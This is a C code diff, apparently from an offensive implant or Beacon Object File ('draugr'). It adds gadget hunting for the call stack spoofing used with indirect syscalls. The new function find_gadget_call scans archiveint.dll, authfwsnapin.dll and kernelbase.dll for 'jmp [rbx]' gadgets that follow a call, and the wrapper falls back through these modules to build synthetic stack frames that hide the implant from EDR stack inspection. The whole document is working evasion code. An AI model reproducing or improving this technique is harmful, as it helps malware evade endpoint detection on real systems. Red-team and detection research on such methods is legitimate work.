@@ -95,7 +95,7 @@ extern PVOID draugr_stub ( PVOID, PVOID, PVOID, PVOID, DRAUGR_PARAMETERS *, PVOI
 
 #define draugr_arg(i) ( ULONG_PTR ) ( call->args [ i ] )
 
-void init_frame_info ( SYNTHETIC_STACK_FRAME * frame )
+void init_frame_info ( SYNTHETIC_STACK_FRAME * frame, PVOID gadget )
 {
     PVOID frame1_module = KERNEL32$GetModuleHandleA ( "kernel32.dll" );
     PVOID frame2_module = KERNEL32$GetModuleHandleA ( "ntdll.dll" );
@@ -108,7 +108,7 @@ void init_frame_info ( SYNTHETIC_STACK_FRAME * frame )
     frame->Frame2.FunctionAddress = ( PVOID ) GetProcAddress ( ( HMODULE ) frame2_module, "RtlUserThreadStart" );
     frame->Frame2.Offset          = 0x2c;
 
-    frame->Gadget                 = KERNEL32$GetModuleHandleA ( "KernelBase.dll" );
+    frame->Gadget                 = gadget;
 }
 
 BOOL get_text_section_size ( PVOID module, PDWORD virtual_address, PDWORD size )
@@ -286,7 +286,63 @@ PVOID find_gadget( PVOID module )
         found_gadgets = TRUE;
     }
 
-    seed   = 0x1337;
+    if ( counter == 0 ) {
+        return NULL;
+    }
+
+    seed   = 0x7331;
+    random = NTDLL$RtlRandomEx ( &seed );
+    random %= counter;
+
+    return gadget_list [ random ];
+}
+
+PVOID find_gadget_call( PVOID module )
+{
+    BOOL  found_gadgets       = FALSE;
+    DWORD text_section_size   = 0;
+    DWORD text_section_va     = 0;
+    DWORD counter             = 0;
+    ULONG seed                = 0;
+    ULONG random              = 0;
+    PVOID module_text_section = NULL;
+
+    PVOID gadget_list [ 15 ] = { 0 };
+
+    if ( ! found_gadgets )
+    {
+        if ( ! get_text_section_size ( module, &text_section_va, &text_section_size ) ) {
+            return NULL;
+        }
+
+        module_text_section = ( PBYTE ) ( ( UINT_PTR ) module + text_section_va );
+
+        for ( int i = 0; i < ( text_section_size - 2 ); i++ )
+        {
+            /* x64 opcodes are ff 23 */
+            if ( ( ( PBYTE ) module_text_section ) [ i ] == 0xFF && ( ( PBYTE ) module_text_section ) [ i + 1 ] == 0x23 )
+            {
+                /* check for a call before the gadget */
+                if ( ( ( PBYTE ) module_text_section ) [ i - 5 ] == 0xE8 )
+                {
+                    gadget_list [ counter ] = ( PVOID ) ( ( UINT_PTR ) module_text_section + i );
+                    counter++;
+
+                    if ( counter == 15 ) {
+                        break;
+                    }
+                }
+            }
+        }
+
+        found_gadgets = TRUE;
+    }
+
+    if ( counter == 0 ) {
+        return NULL;
+    }
+
+    seed   = 0x7331;
     random = NTDLL$RtlRandomEx ( &seed );
     random %= counter;
 
@@ -305,7 +361,58 @@ ULONG_PTR draugr_wrapper ( PVOID function, DWORD ssn, PVOID arg1, PVOID arg2, PV
     }
 
     SYNTHETIC_STACK_FRAME frame;
-    init_frame_info ( &frame );
+    PVOID gadget_module = NULL;
+    PVOID test_gadget   = NULL;
+    BOOL  use_kernelbase_gadget = FALSE;
+
+    /* Try gadget modules in order until we find one with valid gadgets */
+    PVOID gadget1 = KERNEL32$GetModuleHandleA ( "archiveint.dll" );
+    if ( ! gadget1 ) {
+        gadget1 = LoadLibraryA ( "archiveint.dll" );
+    }
+
+    if ( gadget1 )
+    {
+        test_gadget = find_gadget_call ( gadget1 );
+        if ( test_gadget ) {
+            gadget_module = gadget1;
+        }
+    }
+
+    if ( ! gadget_module )
+    {
+        PVOID gadget2 = KERNEL32$GetModuleHandleA ( "authfwsnapin.dll" );
+        if ( ! gadget2 ) {
+            gadget2 = LoadLibraryA ( "authfwsnapin.dll" );
+        }
+
+        if ( gadget2 )
+        {
+            test_gadget = find_gadget_call ( gadget2 );
+            if ( test_gadget ) {
+                gadget_module = gadget2;
+            }
+        }
+    }
+
+    if ( ! gadget_module )
+    {
+        PVOID gadget3 = KERNEL32$GetModuleHandleA ( "kernelbase.dll" );
+        if ( gadget3 )
+        {
+            test_gadget = find_gadget ( gadget3 );
+            if ( test_gadget ) {
+                gadget_module = gadget3;
+                use_kernelbase_gadget = TRUE;
+            }
+        }
+    }
+
+    if ( ! gadget_module ) {
+        return ( ULONG_PTR ) ( NULL );
+    }
+
+    init_frame_info ( &frame, gadget_module );
 
     return_address                                 = ( PVOID ) ( ( UINT_PTR ) frame.Frame1.FunctionAddress + frame.Frame1.Offset );
     draugr_params.BaseThreadInitThunkStackSize     = calculate_function_stack_size_wrapper ( return_address );
@@ -325,9 +432,15 @@ ULONG_PTR draugr_wrapper ( PVOID function, DWORD ssn, PVOID arg1, PVOID arg2, PV
 
     do
     {
-        draugr_params.Trampoline          = find_gadget ( frame.Gadget );
+        /* Use find_gadget for kernelbase.dll, find_gadget_call for others */
+        if ( use_kernelbase_gadget ) {
+            draugr_params.Trampoline = find_gadget ( frame.Gadget );
+        } else {
+            draugr_params.Trampoline = find_gadget_call ( frame.Gadget );
+        }
+
         draugr_params.TrampolineStackSize = calculate_function_stack_size_wrapper ( draugr_params.Trampoline );
-        
+
         attempts++;
 
         if ( attempts > 15 ) {
